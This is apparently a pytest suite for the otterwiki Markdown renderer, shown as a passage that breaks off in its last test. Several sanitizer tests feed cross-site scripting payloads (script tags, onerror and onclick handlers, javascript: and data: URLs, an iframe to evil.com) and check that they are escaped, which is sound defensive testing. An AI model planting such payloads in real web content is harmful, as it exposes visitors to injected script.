#!/usr/bin/env python
# vim: set et ts=8 sts=4 sw=4 ai:

import pytest
from bs4 import BeautifulSoup
from otterwiki.renderer import (
    render,
    clean_html,
    OtterwikiRenderer,
    pygments_render,
)


def test_lastword():
    lastword = render.lastword
    orig = "aaa bbb ccc"
    modified = lastword.sub(r"ddd \1", orig)
    assert modified == "aaa bbb ddd ccc"


def test_basic_markdown():
    html, toc, _ = render.markdown("**bold** _italic_")
    assert "<strong>bold</strong>" in html
    assert "<em>italic</em>" in html


def test_toc():
    md = """
# head 1
text
## head 1.1 **bold**
text
# head 2
# head 2
    """
    html, toc, _ = render.markdown(md)
    # head 1
    assert "head 1" == toc[0][1]
    assert 1 == toc[0][2]
    assert "head-1" == toc[0][4]
    assert "<h1 id=\"head-1\"" in html
    # head 1.1
    assert "head 1.1 <strong>bold</strong>" == toc[1][1]
    assert "<h2 id=\"head-11-bold\"" in html
    # check raw
    assert "head 1.1 bold" == toc[1][3]
    assert "head-11-bold" == toc[1][4]
    assert "<h2 id=\"head-11-bold\"" in html
    assert 2 == toc[1][2]
    # check duplicate header handling
    assert "head-2" == toc[2][4]
    assert "head-2-1" == toc[3][4]
    assert "<h1 id=\"head-2\"" in html
    assert "<h1 id=\"head-2-1\"" in html


def test_codespan():
    html, _, _ = render.markdown("`One Space`")
    assert "One Space" in html
    html, _, _ = render.markdown("`Two  Spaces`")
    assert "Two  Spaces" in html


def test_codeblock_spaces():
    md = """# Header
Paragraph1

    <html>
        <head>
            <title>Test</title>
        </head>
    </html>

Paragraph2.
"""
    html, _, _ = render.markdown(md)

    assert html
    pre_code = BeautifulSoup(html, "html.parser").find(
        'pre', {'class': 'code'}
    )
    assert pre_code
    assert "&lt;title&gt;Test&lt;/title&gt;" in str(pre_code)
    assert "<title>" in pre_code.text


def test_codeblock_backticks():
    html, _, _ = render.markdown(
        """```
abc
```"""
    )
    pre_code = BeautifulSoup(html, "html.parser").find(
        'pre', {'class': 'code'}
    )
    assert pre_code is not None
    assert 'abc' in pre_code.text
    # test highlight
    html, _, _ = render.markdown(
        """```python
n = 0
```"""
    )
    assert '<div class="highlight">' in html
    pre_code = BeautifulSoup(html, "html.parser").find('pre')
    assert pre_code is not None
    assert pre_code.text.startswith('n = 0')
    # test missing lexer
    html, _, _ = render.markdown(
        """```non_existing_lexer
n = 0
```"""
    )
    pre_code = BeautifulSoup(html, "html.parser").find(
        'pre', {'class': 'code'}
    )
    assert pre_code is not None
    assert pre_code.text.startswith('non_existing_lexer')
    # test highlight with line numbers
    html, _, _ = render.markdown(
        """```python=
n = 2
```"""
    )
    assert '<table class="highlighttable">' in html
    table_code = BeautifulSoup(html, "html.parser").find(
        'table', attrs={"class": "highlighttable"}
    )
    assert table_code is not None
    td_linenos = table_code.find(
        "td", attrs={"class": "linenos"}
    )  # pyright: ignore
    assert td_linenos is not None
    assert td_linenos.text.startswith('1')
    td_code = table_code.find("td", attrs={"class": "code"})  # pyright: ignore
    assert td_code is not None
    assert td_code.text.startswith('n = 2')


def test_img():
    text = "![](/path/to/img.png)"
    html, _, _ = render.markdown(text)
    assert 'src="/path/to/img.png"' in html

    text = '![](/path/to/img.png "title")'
    html, _, _ = render.markdown(text)
    assert 'src="/path/to/img.png"' in html
    assert 'title="title"' in html

    text = '![alt text](/path/to/img.png "title")'
    html, _, _ = render.markdown(text)
    assert 'src="/path/to/img.png"' in html
    assert 'title="title"' in html
    assert 'alt="alt text"' in html


def test_html_mark():
    text = "<mark>mark</mark>"
    html, _, _ = render.markdown(text)
    assert "<mark>mark</mark>" in html


def test_wiki_link():
    text = "[[Title|Link]]"
    html, _, _ = render.markdown(text)
    assert '<a href="/Link">Title</a>' in html
    text = "[[Link]]"
    html, _, _ = render.markdown(text)
    assert '<a href="/Link">Link</a>' in html
    text = "[[Text with spaces|Link with spaces]]"
    html, _, _ = render.markdown(text)
    assert '<a href="/Link%20with%20spaces">Text with spaces</a>' in html
    text = "[[A long long long page name]]"
    html, _, _ = render.markdown(text)
    assert (
        '<a href="/A%20long%20long%20long%20page%20name">A long long long page name</a>'
        in html
    )


def test_wiki_link_anchor():
    text = "[[Link with#anchor]]"
    html, _, _ = render.markdown(text)
    assert '<a href="/Link%20with#anchor">Link with#anchor</a>' in html
    text = "[[Link with#Some Heading]]"
    html, _, _ = render.markdown(text)
    assert (
        '<a href="/Link%20with#some-heading">Link with#Some Heading</a>'
        in html
    )


def test_wiki_link_anchor2():
    text = "[[Link with anchor and title|Link with#anchor]]"
    html, _, _ = render.markdown(text)
    assert (
        '<a href="/Link%20with#anchor">Link with anchor and title</a>' in html
    )
    text = "[[Link with title and#Some Heading]]"
    html, _, _ = render.markdown(text)
    assert (
        '<a href="/Link%20with%20title%20and#some-heading">Link with title and#Some Heading</a>'
        in html
    )


def test_wiki_link_subspace():
    text = "[[Paul|people/Paul]]"
    html, _, _ = render.markdown(text)
    assert '<a href="/people/Paul">Paul</a>' in html


def test_wiki_link_compatibility_mode():
    configured_renderer = OtterwikiRenderer(
        config={"WIKILINK_STYLE": "LinkTitle"}
    )
    text = "[[people/Paul|Paul]]"
    html, _, _ = configured_renderer.markdown(text)
    assert '<a href="/people/Paul">Paul</a>' in html
    text = "[[/people/Paul|Paul]]"
    html, _, _ = configured_renderer.markdown(text)
    assert '<a href="/people/Paul">Paul</a>' in html
    text = "[[Link]]"
    html, _, _ = render.markdown(text)
    assert '<a href="/Link">Link</a>' in html


def test_wiki_link_in_table():
    text = """| name | date | link |
| -------- | -------- | -------- |
| John | 01/31/1996 | [[people/John]] |
| Mary |10/08/2001 | [[Mary|people/Mary]] |

[[Paul|people/Paul]]
`[[Peter|Petra]]`

"""
    html, _, _ = render.markdown(text)
    assert '<td><a href="/people/John">people/John</a></td>' in html
    assert '<a href="/people/Paul">Paul</a>' in html
    assert '<td><a href="/people/Mary">Mary</a></td>' in html


def test_wiki_link_in_code():
    text = """`[[people/John]]`

```
[[Mary|people/Mary]]
```
"""
    html, _, _ = render.markdown(text)
    assert '<a href="/people/John">people/John</a>' not in html
    assert '<a href="/people/Mary">Mary</a>' not in html
    assert '[[people/John]]' in html
    assert '[[Mary|people/Mary]]' in html


def test_table_align():
    text = """
| left th     | center th     | right th  |
|:----------- |:-------------:| ---------:|
| left td     | center td     | right td  |
"""
    html, _, _ = render.markdown(text)
    # check header
    assert '<th style="text-align:left">left th</th>' in html
    assert '<th style="text-align:center">center th</th>' in html
    assert '<th style="text-align:right">right th</th>' in html
    # check cells
    assert '<td style="text-align:left">left td</td>' in html
    assert '<td style="text-align:center">center td</td>' in html
    assert '<td style="text-align:right">right td</td>' in html


def test_clean_html_nested_xss():
    """Test that XSS via nested elements inside allowed wrapper tags is blocked.
    Regression test for clean_html() only checking top-level elements.
    """
    # <script> nested inside an allowed <p> tag
    result = clean_html('<p><script>alert(1)</script></p>')
    assert '<script>' not in result
    assert '&lt;script&gt;' in result

    # event handler on <img> nested inside an allowed <div> — whole block must be escaped
    result = clean_html('<div><img src="x" onerror="alert(1)"></div>')
    assert (
        '<div>' not in result
    )  # the whole block is escaped, not passed through
    assert '&lt;div&gt;' in result

    # deeply nested dangerous tag: <p> > <span> > <script>
    result = clean_html('<p><span><script>alert(2)</script></span></p>')
    assert '<script>' not in result
    assert '&lt;script&gt;' in result

    # javascript: href on <a> nested inside an allowed <div> — whole block must be escaped
    result = clean_html('<div><a href="javascript:alert(3)">click</a></div>')
    assert '<div>' not in result
    assert '&lt;div&gt;' in result

    # disallowed tag nested inside an allowed <blockquote>
    result = clean_html(
        '<blockquote><iframe src="https://evil.com"></iframe></blockquote>'
    )
    assert '<iframe' not in result
    assert '&lt;iframe' in result


def test_clean_html_script():
    assert clean_html("<script>") == "&lt;script&gt;"
    assert (
        clean_html("<script>alert(1)</script>")
        == "&lt;script&gt;alert(1)&lt;/script&gt;"
    )
    assert (
        clean_html('<p onclick="alert(4)">PPPPP</p>')
        == '&lt;p onclick=&#34;alert(4)&#34;&gt;PPPPP&lt;/p&gt;'
    )


def test_clean_html_xss_vectors():
    """Test that various XSS attack vectors are properly blocked"""
    # Test object tag with data: protocol
    assert (
        clean_html('<object data="data:text/html,<script>alert(1)</script>">')
        == '&lt;object data=&#34;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&#34;&gt;'
    )

    # Test iframe with javascript: protocol
    assert (
        clean_html('<iframe src="javascript:alert(2)"></iframe>')
        == '&lt;iframe src=&#34;javascript:alert(2)&#34;&gt;&lt;/iframe&gt;'
    )

    # Test iframe with data: protocol
    assert (
        clean_html(
            '<iframe src="data:text/html,<script>alert(3)</script>"></iframe>'
        )
        == '&lt;iframe src=&#34;data:text/html,&lt;script&gt;alert(3)&lt;/script&gt;&#34;&gt;&lt;/iframe&gt;'
    )

    # Test SVG with animate and onbegin event
    assert (
        clean_html('<svg><animate onbegin=alert(4) attributeName=x dur=1s>')
        == '&lt;svg&gt;&lt;animate onbegin=alert(4) attributeName=x dur=1s&gt;'
    )

    # Test embed tag (not in allowed list)
    assert (
        clean_html('<embed src="test.swf">')
        == '&lt;embed src=&#34;test.swf&#34;&gt;'
    )

    # Test various event handlers
    assert (
        clean_html('<div onload="alert(5)">test</div>')
        == '&lt;div onload=&#34;alert(5)&#34;&gt;test&lt;/div&gt;'
    )
    assert (
        clean_html('<img src="x" onerror="alert(6)">')
        == '&lt;img src=&#34;x&#34; onerror=&#34;alert(6)&#34;&gt;'
    )
    assert (
        clean_html('<body onbeforeprint="alert(7)">')
        == '&lt;body onbeforeprint=&#34;alert(7)&#34;&gt;'
    )

    # Test formaction attribute
    assert (
        clean_html('<button formaction="javascript:alert(8)">Click</button>')
        == '&lt;button formaction=&#34;javascript:alert(8)&#34;&gt;Click&lt;/button&gt;'
    )

    # Test srcdoc attribute
    assert (
        clean_html('<iframe srcdoc="<script>alert(9)</script>"></iframe>')
        == '&lt;iframe srcdoc=&#34;&lt;script&gt;alert(9)&lt;/script&gt;&#34;&gt;&lt;/iframe&gt;'
    )


def test_clean_html_allowed_tags():
    """Test that allowed tags pass through correctly"""
    # Test basic formatting tags
    assert clean_html('<p>test</p>') == '<p>test</p>'
    assert clean_html('<strong>bold</strong>') == '<strong>bold</strong>'
    assert clean_html('<em>italic</em>') == '<em>italic</em>'

    # Test links with safe protocols
    result = clean_html('<a href="https://example.com">link</a>')
    assert (
        '<a' in result
        and 'href="https://example.com"' in result
        and '>link</a>' in result
    )

    result = clean_html('<a href="/page">link</a>')
    assert (
        '<a' in result and 'href="/page"' in result and '>link</a>' in result
    )

    # Test images with safe src
    result = clean_html('<img src="/image.png" alt="test">')
    assert (
        '<img' in result
        and 'src="/image.png"' in result
        and 'alt="test"' in result
    )


def test_clean_html_custom_tags():
    """Test that custom allowed tags work"""
    from otterwiki.renderer import parse_custom_allowlist

    # Without custom tags, svg should be escaped (not in default list)
    result = clean_html('<svg><circle cx="50" cy="50" r="40"/></svg>')
    assert '&lt;svg' in result  # Should be escaped

    # With custom tags AND their attributes, svg/circle should be allowed
    # cx, cy, r are attributes on circle that must also be allowlisted
    custom_allowlist = 'svg,circle[cx cy r]'
    custom_tags, custom_attributes = parse_custom_allowlist(custom_allowlist)
    result = clean_html(
        '<svg><circle cx="50" cy="50" r="40"/></svg>',
        custom_tags=custom_tags,
        custom_attributes=custom_attributes,
    )
    # SVG tag should be present
    assert (
        '<svg' in result and '&lt;svg' not in result
    )  # Should NOT be escaped
    assert '<circle' in result


def test_clean_html_custom_attributes():
    """Test that custom attributes can be specified for tags"""
    from otterwiki.renderer import parse_custom_allowlist

    # iframe is not in default list, so it should be escaped
    result = clean_html(
        '<iframe src="https://example.com" width="800" height="600"></iframe>'
    )
    assert '&lt;iframe' in result

    # Allow iframe with specific attributes (space-separated)
    custom_allowlist = 'iframe[src width height]'
    custom_tags, custom_attributes = parse_custom_allowlist(custom_allowlist)
    result = clean_html(
        '<iframe src="https://example.com" width="800" height="600"></iframe>',
        custom_tags=custom_tags,
        custom_attributes=custom_attributes,
    )
    assert '<iframe' in result and '&lt;iframe' not in result
    assert 'src="https://example.com"' in result
    assert 'width="800"' in result

    # But dangerous protocols should still be blocked
    result = clean_html(
        '<iframe src="javascript:alert(1)"></iframe>',
        custom_tags=custom_tags,
        custom_attributes=custom_attributes,
    )
    assert (
        '&lt;iframe' in result
    )  # Should be escaped due to dangerous protocol

    # Test multiple tags with mixed attribute specifications
    # rect must also be allowlisted since it is a nested child of svg
    custom_allowlist = 'iframe[src width height],svg,rect,button'
    custom_tags, custom_attributes = parse_custom_allowlist(custom_allowlist)
    result = clean_html(
        '<svg><rect/></svg><button>Click</button>',
        custom_tags=custom_tags,
        custom_attributes=custom_attributes,
    )
    assert '<svg' in result and '<button' in result

    # Test that if user explicitly allowlists onclick, it's allowed (pure allowlist approach)
    custom_tags, custom_attributes = parse_custom_allowlist('button[onclick]')
    result = clean_html(
        '<button onclick="alert(1)">Click</button>',
        custom_tags=custom_tags,
        custom_attributes=custom_attributes,
    )
    assert (
        '<button' in result and 'onclick="alert(1)"' in result
    )  # onclick is explicitly allowlisted

    # But onclick is NOT allowed without explicit allowlisting
    custom_tags, custom_attributes = parse_custom_allowlist('button')
    result = clean_html(
        '<button onclick="alert(1)">Click</button>',
        custom_tags=custom_tags,
        custom_attributes=custom_attributes,
    )
    assert (
        '&lt;button' in result
    )  # Should be escaped because onclick is not in default attributes


def test_clean_html_render():
    text = """Preformatted script:

    <script>alert(1)</script>

```html
<script>alert(3)</script>
```
<script>alert(2)</script>

And last an onclick example:
<p onclick="alert(4)">PPPPP</p>

<video controls width='80%'> <!-- this is updated to width="80%" -->
<source src="/mp4%20example/example.mp4" type="video/mp4">
</video>
"""
    html, _, _ = render.markdown(text)
    # make sure that preformatted html stays preformatted
    pre_code = BeautifulSoup(html, "html.parser").find_all(
        'pre', {'class': 'copy-to-clipboard'}
    )
    assert pre_code is not None
    assert (
        "<script>alert(1)</script>" in pre_code[0].text
    )  # bs4 decodes the html already
    # make sure that highlighted blocks are okay
    assert (
        '<span class=".highlight p">&lt;</span><span class=".highlight nt">script</span><span class=".highlight p">&gt;</span><span class=".highlight nx">alert</span><span class=".highlight p">(</span><span class=".highlight mf">3</span><span class=".highlight p">)&lt;/</span><span class=".highlight nt">script</span><span class=".highlight p">&gt;</span>'
        in str(pre_code[1])
    )
    # but script code is removed
    assert '<script>alert(2)</script>' not in html
    # and that onlick is removed
    assert '<p onclick="alert(4)"' not in html
    # check multimedia
    assert '<video controls="" width="80%">' in html
    assert "</video>" in html


def test_strikethrough():
    md = """
~~strike1~~
alpha bravo ~~strike2~~ charlie
~~s~t~r~i~k~e~3~~
~~strike4~~"""
    html, _, _ = render.markdown(md)
    assert "<del>strike1</del>" in html
    assert "<del>strike2</del>" in html
    assert "<del>strike3</del>" not in html
    assert "<del>strike4</del>" in html


def test_mark():
    md = """
==mark1==
alpha bravo ==mark2== charlie
==m=a=r=k=3==

inline code `alpha ==mark7== bravo` charlie

- alpha
- ==mark5==
- charlie

```
==mark6===
```

==mark4=="""
    html, _, _ = render.markdown(md)
    assert "<mark>mark1</mark>" in html
    assert "<mark>mark2</mark>" in html
    assert "<mark>mark3</mark>" not in html
    assert "<mark>mark4</mark>" in html
    assert "<mark>mark5</mark>" in html
    assert "<mark>mark6</mark>" not in html
    assert "<mark>mark7</mark>" not in html


def test_math_block():
    md = """
```math
a^2+b^2=c^2
```
multiline
```math
a=b
c=d
```
"""
    html, _, _ = render.markdown(md)
    assert "\\[a=b\\]" in html
    assert "\\[c=d\\]" in html
    assert "\\[a^2+b^2=c^2\\]" in html


def test_math_code_inline():
    text = "`$a$`"
    html, _, _ = render.markdown(text)
    assert "\\(a\\)" in html


def test_math_in_code_backticks():
    md = r"""# Header
The TeX style, where inline math is encapsulated with `$` and equations with `$$`, e.g.

```
    When $a \ne 0$, there are two solutions
    to $ax^2 + bx + c = 0$ and they are

    $$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$
```

Fin.
"""
    html, _, _ = render.markdown(md)
    pre_code = BeautifulSoup(html, "html.parser").find(
        'pre', {'class': 'code'}
    )
    assert pre_code
    assert r"$$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$" in str(pre_code)
    assert "<code>$</code>" in html
    assert "<code>$$</code>" in html


def test_math_in_code():
    md = r"""# Header
The TeX style, where inline math is encapsulated with `$` and equations with `$$`, e.g.

    When $a \ne 0$, there are two solutions
    to $ax^2 + bx + c = 0$ and they are

    $$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$

Fin.
"""
    html, _, _ = render.markdown(md)
    assert html
    pre_code = BeautifulSoup(html, "html.parser").find(
        'pre', {'class': 'code'}
    )
    assert pre_code
    assert r"$$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$" in str(pre_code)


def test_mathjax_inline_in_list():
    md = r"""- item $a^2$ end
- item `$b^2$` end
"""
    html, _, _ = render.markdown(md)
    assert "\\(a^2\\)" in html
    assert "\\(b^2\\)" in html


def test_mathjax_inline_in_ordered_list():
    md = r"""1. First $x = 1$
2. Second $y = 2$
"""
    html, _, _ = render.markdown(md)
    assert "\\(x = 1\\)" in html
    assert "\\(y = 2\\)" in html
    assert "<ol>" in html


def test_mathjax_inline_in_nested_list():
    md = r"""- item one
  - nested $a + b$
- item two $c + d$
"""
    html, _, _ = render.markdown(md)
    assert "\\(a + b\\)" in html
    assert "\\(c + d\\)" in html


def test_mathjax_block_in_list():
    md = r"""- item one

  $$x = 1$$

- item two
"""
    html, _, _ = render.markdown(md)
    assert "\\[x = 1\\]" in html
    soup = BeautifulSoup(html, "html.parser")
    items = soup.find_all('li')
    assert len(items) == 2
    assert "item one" in items[0].get_text()
    assert "item two" in items[1].get_text()


def test_math_codespan_in_list():
    md = r"""- item with `$` and `$$`
- another item
"""
    html, _, _ = render.markdown(md)
    assert "<code>$</code>" in html
    assert "<code>$$</code>" in html


def test_math_code_block_in_list():
    md = r"""- item one

        $$x = 1$$

- item two
"""
    html, _, _ = render.markdown(md)
    pre_code = BeautifulSoup(html, "html.parser").find(
        'pre', {'class': 'code'}
    )
    assert pre_code
    assert "$$x = 1$$" in pre_code.text
    soup = BeautifulSoup(html, "html.parser")
    items = soup.find_all('li')
    assert len(items) == 2
    assert "item one" in items[0].get_text()
    assert "item two" in items[1].get_text()


def test_math_code_mix_in_list():
    md = r""" ## Lists

- abc `$x=2`
- def `$y=3`
- Block
  ```math
  x=3
  ```
- line2
- Block $$y=4$$
- line4
"""
    html, _, _ = render.markdown(md)
    assert html
    soup = BeautifulSoup(html, "html.parser")
    items = soup.find_all('li')
    assert len(items) == 6
    print(items)
    # backtick code spans with $ prefix are not mathjax
    assert items[0].find('code').string == '$x=2'
    assert items[1].find('code').string == '$y=3'
    # ```math block renders as mathjax block
    assert "\\[x=3\\]" in str(items[2])
    assert "line2" in items[3].get_text()
    # inline $$y=4$$ renders as mathjax display math
    assert "\\[y=4\\]" in str(items[4])
    assert "line4" in items[5].get_text()


def test_latex_inline():
    md = """
$latex1$
Alpha bravo $latex2$ charlie

```
alpha bravo $latex4$ charlie
```

and a block

    $latex5$

and a list

- alpha
- $latex6$
- charlie

$latex3$"""

    html, _, _ = render.markdown(md)
    assert "\\(latex1\\)" in html
    assert "\\(latex2\\)" in html
    assert "\\(latex3\\)" in html
    assert "\\(latex4\\)" not in html
    assert "\\(latex5\\)" not in html
    assert "\\(latex6\\)" in html


def test_footnote_named():
    md = """Footnote identifier[^1] are single characters or words[^bignote].
And can be referenced multiple[^1] times.

[^1]: Footnotes test

[^bignote]: Or more complex.

    Indent paragraphs to include them
    in the footnote.

    Add as many paragraphs as you like.
"""
    html, _, _ = render.markdown(md)
    assert 'id="fn-1"' in html
    assert 'href="#fn-1"' in html
    assert 'id="fnref-1"' in html
    assert 'href="#fnref-1"' in html
    assert 'id="fn-2"' in html
    assert 'href="#fn-2"' in html
    assert 'id="fnref-2"' in html
    assert 'href="#fnref-2"' in html


def test_footnote_multiref():
    md = "\n".join(["Hello World [^1]" for _ in range(27)])
    md += "\n\n[^1]: Footnotes test"
    html, _, _ = render.markdown(md)
    assert '<a class="footnote" href="#fnref-27">aa</a>' in html


def test_footnote_not_found():
    md = "Footnote[^1]"
    html, _, _ = render.markdown(md)
    assert '<p>Footnote[^1]</p>' in html


def test_tasklist():
    md = """- [ ] a
- [x] b
- [ ] c"""
    html, _, _ = render.markdown(md)
    assert 3 == html.count("<li ") == html.count("</li>")
    assert 1 == html.count("checked")

    md = """<p>

- [ ] a
- [x] b
- [ ] c

</p>"""
    html, _, _ = render.markdown(md)
    assert 3 == html.count("<li ") == html.count("</li>")
    assert 1 == html.count("checked")


def test_fancy_blocks():
    md = """::: info
# Head of the block.
With _formatted_ content.
:::"""
    html, _, _ = render.markdown(md)
    assert '<h4 class="alert-heading">Head of the block.</h4>' in html
    assert '<em>formatted</em>' in html
    assert '<div class="alert alert-primary' in html
    assert 'role="alert"' in html

    md = """::: warning
a warning without header
:::"""
    html, _, _ = render.markdown(md)
    assert "<h4>" not in html
    assert 'class="alert alert-secondary' in html
    assert 'role="alert"' in html

    md = """::: success
good news everybody
:::"""
    html, _, _ = render.markdown(md)
    assert "<h4>" not in html
    assert 'class="alert alert-success' in html
    assert 'role="alert"' in html

    md = """::: red
**red alert**
:::"""
    html, _, _ = render.markdown(md)
    assert "<h4>" not in html
    assert "<strong>red alert</strong>" in html
    assert 'class="alert alert-danger' in html
    assert 'role="alert"' in html

    md = """:::
# Head of the block
_unspecified alert_
:::"""
    html, _, _ = render.markdown(md)
    assert '<h4 class="alert-heading">Head of the block</h4>' in html
    assert '<em>unspecified alert</em>' in html

    md = """::: myblock
# Head of my block
With _formatted_ content.
"""
    html, _, _ = render.markdown(md)
    assert 'class="alert alert-myblock' in html


def test_fancy_blocks_multiline():
    # Multi-paragraph body must stay inside the div (regression: $ under re.MULTILINE
    # matches end-of-line, causing the lazy [\s\S]*? to stop after the first body line)
    md = """:::info
# An info block

with some content.
:::

and some text."""
    html, _, _ = render.markdown(md)
    assert '<h4 class="alert-heading">An info block</h4>' in html
    assert '<div class="alert alert-primary' in html
    from bs4 import BeautifulSoup

    soup = BeautifulSoup(html, "html.parser")
    div = soup.find("div", class_="alert-primary")
    assert div is not None, "alert-primary div not found"
    assert "with some content" in div.get_text()
    # trailing paragraph is outside the div
    paras = soup.find_all("p")
    outside_paras = [
        p for p in paras if not p.find_parent("div", class_="alert")
    ]
    assert any("and some text" in p.get_text() for p in outside_paras)


def test_spoiler():
    md = """>! Spoiler blocks reveal their
>! content on click on the icon."""
    html, _, _ = render.markdown(md)
    # easier testing
    html = html.replace("\n", "")
    assert (
        '<p>Spoiler blocks reveal their content on click on the icon.</p>'
        in html
    )
    assert 'spoiler-button' in html


def test_spoiler_after_list():
    md = """1. Test
2. Test

>! Spoiler content
"""
    html, _, _ = render.markdown(md)
    assert 'spoiler' in html, "spoiler not rendered after list"
    assert 'Spoiler content' in html


def test_spoiler_after_list_with_paragraph():
    md = """1. Test
2. Test

Another line

>! Spoiler content
"""
    html, _, _ = render.markdown(md)
    assert 'spoiler' in html, "spoiler not rendered after list with paragraph"
    assert 'Spoiler content' in html
    assert 'Another line' in html


def test_fold():
    md = """>| # Headline is used as summary
>| with the details folded."""
    html, _, _ = render.markdown(md)
    # easier testing
    html = html.replace("\n", "")
    # check headline
    assert '>Headline is used as summary</summary>' in html
    # check fold
    assert "<p>with the details folded.</p>" in html


def test_fold_after_list():
    md = """1. Test
2. Test

>| # Summary
>| Folded content
"""
    html, _, _ = render.markdown(md)
    assert 'collapse-panel' in html, "fold not rendered after list"
    assert 'Summary' in html
    assert 'Folded content' in html


def test_fold_after_list_with_paragraph():
    md = """1. Test
2. Test

Another line

>| # Summary
>| Folded content
"""
    html, _, _ = render.markdown(md)
    assert (
        'collapse-panel' in html
    ), "fold not rendered after list with paragraph"
    assert 'Summary' in html
    assert 'Folded content' in html
    assert 'Another line' in html


def test_all_alert_types():
    from otterwiki.renderer_plugins import mistunePluginAlerts

    def alert_tests():
        for type, icon in mistunePluginAlerts.TYPE_ICONS.items():
            yield type, icon
            yield type.lower(), icon

    for type, icon in alert_tests():
        md = f"> [!{type}]\n>text\n>text\n"
        html, _, _ = render.markdown(md)
        assert 'text\ntext' in html
        assert icon in html
        assert f"[!{type}]" not in html


def test_alerts():
    md = """random paragraph 1.

>[!TIP]
>Note content

random paragraph 2."""
    html, _, _ = render.markdown(md)
    # easier testing
    html = html.replace("\n", "")
    # check content
    assert 'Note content' in html
    assert 'Tip</div>'
    # make sure nothing is lost
    assert '<p>random paragraph 1.</p>' in html
    assert '<p>random paragraph 2.</p>' in html


def test_alert_after_list():
    md = """1. Test
2. Test

> [!TIP]
> Content
"""
    html, _, _ = render.markdown(md)
    assert 'quote-alert' in html, "alert not rendered after list"
    assert 'Content' in html


def test_alert_after_list_with_paragraph():
    md = """1. Test
2. Test

Another line

> [!TIP]
> Content
"""
    html, _, _ = render.markdown(md)
    assert (
        'quote-alert' in html
    ), "alert not rendered after list with paragraph"
    assert 'Content' in html
    assert 'Another line' in html


def test_mistunePluginAlerts():
    from otterwiki.renderer_plugins import mistunePluginAlerts

    for type, icon in mistunePluginAlerts.TYPE_ICONS.items():
        # check regexp
        md = f">[!{type}]\n>Note content\n>content\n"
        m = mistunePluginAlerts.ALERT_BLOCK.search(md)
        assert m is not None
        assert m.group(1) == type


def test_mermaid():
    md = """
```mermaid
graph TD;
    A-->B;
```
"""
    html, _, _ = render.markdown(md)
    assert (
        """<pre class="mermaid">graph TD;
    A--&gt;B;\n</pre>"""
        in html
    )


def test_pygments_render_python_doublebracket():
    code = """df[['a', "b"]]"""
    html = pygments_render(code, "python", linenumbers=False)
    code = BeautifulSoup(html, "html.parser").find(
        'div', {'class': 'highlight'}
    )
    assert code
    code = str(code.text)
    assert """df[['a', "b"]]""" in code


def test_render_python_doublebracket():
    # https://github.com/redimp/otterwiki/issues/190
    md = """```python
df[['a', "b"]]
```"""
    html, _, _ = render.markdown(md)
    code = BeautifulSoup(html, "html.parser").find(
        'div', {'class': 'highlight'}
    )
    assert code
    code = code.text
    assert """df[['a', "b"]]""" in code


def test_indent_preformatted_issue206():
    md = """# Preformatted

     Hello :) This is at 5 spaces.
     5 spaces here as well."""
    html, _, _ = render.markdown(md)
    pre = BeautifulSoup(html, "html.parser").find('pre')
    assert pre
    assert (
        """ Hello :) This is at 5 spaces.
 5 spaces here as well."""
        == pre.text
    )
    # backtick block
    md = """# Code block

```
 One leading space here
  and two here.
```
"""
    html, _, _ = render.markdown(md)
    pre = BeautifulSoup(html, "html.parser").find('pre')
    assert pre
    assert (
        """ One leading space here
  and two here.\n"""
        == pre.text
    )

    # backtick block with language
    md = """# Code block

```c
 int main(int argc, char **argv) {
  }
```
"""
    html, _, _ = render.markdown(md)
    code = BeautifulSoup(html, "html.parser").find(
        'div', {'class': 'highlight'}
    )
    assert code
    assert (
        """ int main(int argc, char **argv) {
  }\n"""
        == code.text
    )


def test_indent_preformatted_issue212():
    md = """# Example page

    This is preformatted.

This is regular."""
    html, _, _ = render.markdown(md)
    pre = BeautifulSoup(html, "html.parser").find('pre')
    assert pre
    assert """This is preformatted.\n""" == pre.text


def test_nested_list():
    md = """# Nested lists
1. A
    - B
    - C
2. D
"""
    html, _, _ = render.markdown(md)
    ol = BeautifulSoup(html, "html.parser").find('ol')
    assert ol
    li = ol.find_all("li")  # pyright: ignore
    assert len(li) == 4
    ul = li[0].find("ul")
    assert ul
    li = ul.find_all("li")  # pyright: ignore
    assert len(li) == 2


def test_empty_blocks_issue216():
    md = """:::info
:::
    """
    html, _, _ = render.markdown(md)
    assert html

    md = """>|"""
    html, _, _ = render.markdown(md)
    assert html


def test_frontmatter():
    md = """---
title: Title from frontmatter
tag: test
date: 2025-04-06 11:05:01
---
    """
    html, _, _ = render.markdown(md)
    soup = BeautifulSoup(html, "html.parser")
    assert soup
    # check if the "title" key added a <h1></h1>
    h1 = soup.find("h1")
    assert h1
    assert h1.text == "Title from frontmatter"
    # check if the tag was added to the frontmatter
    details = soup.find("details", {"id": "frontmatter"})
    assert details
    pre = details.find("pre")
    assert pre is not None
    assert hasattr(pre, "text")
    assert "tag: test" in pre.text  # pyright:ignore


def test_library_requirements_mermaid():
    md = """
```mermaid
graph TD;
    A-->B;
```
"""
    html, toc, library_requirements = render.markdown(md)
    assert library_requirements['requires_mermaid'] is True
    assert library_requirements['requires_mathjax'] is False
    assert '<pre class="mermaid">' in html


def test_library_requirements_mathjax_inline():
    md = "This is inline math: `$a^2+b^2=c^2$`"
    html, toc, library_requirements = render.markdown(md)
    assert library_requirements['requires_mermaid'] is False
    assert library_requirements['requires_mathjax'] is True
    assert "\\(a^2+b^2=c^2\\)" in html


def test_library_requirements_mathjax_inline_dollar():
    md = "Some text $a=b$ more text."
    html, toc, library_requirements = render.markdown(md)
    assert library_requirements['requires_mathjax'] is True
    assert "\\(a=b\\)" in html


def test_library_requirements_mathjax_display_inline():
    md = "Inline display: $$x+y=z$$ end."
    html, toc, library_requirements = render.markdown(md)
    assert library_requirements['requires_mathjax'] is True
    assert "\\[x+y=z\\]" in html


def test_library_requirements_mathjax_display_block():
    md = """Some intro text.

$$
a^2 + b^2 = c^2
$$

End text."""
    html, toc, library_requirements = render.markdown(md)
    assert library_requirements['requires_mathjax'] is True
    assert "\\[" in html and "\\]" in html


def test_library_requirements_mathjax_block():
    md = """# Math Example

Here is a math block:

```math
x + y = z
```

End of example."""
    html, toc, library_requirements = render.markdown(md)
    assert library_requirements['requires_mermaid'] is False
    assert library_requirements['requires_mathjax'] is True
    assert "\\[x + y = z\\]" in html
    assert "<h1" in html


def test_library_requirements_both():
    md = """
# Test Page

Inline math: `$E=mc^2$`

```mermaid
